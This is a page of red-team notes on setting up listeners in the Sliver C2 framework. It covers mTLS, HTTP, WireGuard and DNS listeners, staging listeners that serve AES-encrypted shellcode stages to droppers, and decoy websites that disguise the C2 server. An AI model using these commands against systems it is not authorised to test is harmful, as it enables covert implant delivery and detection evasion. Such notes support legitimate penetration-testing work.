| üè† [Home](../../redteam.md) | ‚¨ÖÔ∏è ‚¨ÖÔ∏è [Part](../_part) | ‚¨ÖÔ∏è [Chapter](./_chapter) |
|-----------------------------|----------------------|-------------------------|


* [Listeners](../../red_team/sliver/listeners.md)
    * [Standard listeners](../../red_team/sliver/listeners.md#standard-listeners)
    * [stagging listener](../../red_team/sliver/listeners.md#stagging-listener)
    * [websites](../../red_team/sliver/listeners.md#websites)

# Listeners

## Standard listeners

-   `http/https` - for communication over the HTTP(S) protocol
-   `mtls` communication using mutual-TLS, a protocol in which both theimplant and the server present a certificate that the other mustvalidate. If one certificate fails, the connection does not happen.
-   `wg` - communication using WireGuard, which essentially creates a lightweight VPN to communicate over. See [How does wireguard work](https://github.com/BishopFox/sliver/discussions/721)
-   `dns` - definitely one of the more finnicky options where you leverage a domain that you control to transmit data over. This is all UDP and I don't really recommend it for beginners.

creatin a listener:
```bash
mtls --lport <listening_ip> -lport <listening_port> --website <website_name>
```
list all the listeners:
```bash
jobs
```

For the HTTP(S) listener, we can make some modifications to the C2 profile file `~/.sliver/config/http-c2.json`, such as adding a legitimate request or response headers and changing filenames and extensions in URL generation. We can refer to the Sliver wiki to understand the profile file [HTTP(s) under the hood](https://sliver.sh/docs?name=HTTPS+C2).

## stagging listener

Used to deliver a stage 2 payload to dropper. Stage 2 payload imlemented
by the profiles feature so stagging listener must reference a profile

Sliver staging listeners only accept `tcp://`, `http://` and `https://`
schemes for the `--url` flag. The format for this flag is
`scheme://IP:PORT`. If no value is specified for `PORT`, an error will
be thrown out.

Sliver supports encryption and compression when serving stages.
Compression options are zlib, gzip, and deflate (level 9). Encryption is
done via AES-CBC-128, since this encryption is primarily for obfuscation
we don't really need a more secure cipher mode.

    stage-listener --url http://192.168.0.52:80 --profile win-shellcode 
        --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV

see [Writing a Sliver C2 Powershell Stager with Shellcode Compression and AES Encryption](https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8)

    stage-listener --url http://192.168.122.1:1234 --profile win-shellcode

If you want to use stagers generated by the Metasploit Framework with
Sliver (using msfconsole or msfvenom), you will need to pass the
additional `--prepend-size` flag to `stage-listener`

    stage-listener --url http://192.168.122.1:1234 --profile win-shellcode --prepend-size

We use the `--prepend-size` since we are going to be using the
Metasploit/msfvenom stager, but if you write your own custom one, you
shouldn't include that flag.

## websites

Sliver can stand up a website on your HTTP(S) listener in order to make
the server look more legitimate. For example, you could put a default
IIS index page here and mimic a normal-looking server in case someone
comes by snooping.

Each \"website\" is identified by a name and is essentially just
key\<-\>value pairs request paths (e.g. /foo/bar.html) and response's
content. Currently we don't support any regex matching for paths, it has
to be an exact match, so keep that in mind if you're linking to content.

Note: C2 related messages are identified, intercepted, and responded to
prior to checking for user-provided website content, so you can actually
map content to any URL used for C2.

By default when using the https listener Sliver will simply generate a
random self-signed certificate. However, other options do exist

        ++ Examples ++
        List websites:
        websites
        
        List the contents of a website:
        websites [name]
        
        Add content to a website:
        websites add-content --website blog --web-path / --content ./index.html
        websites add-content --website blog --web-path /public --content ./public --recursive
        
        Delete content from a website:
        websites rm-content --website blog --web-path /index.html
        websites rm-content --website blog --web-path /public --recursive
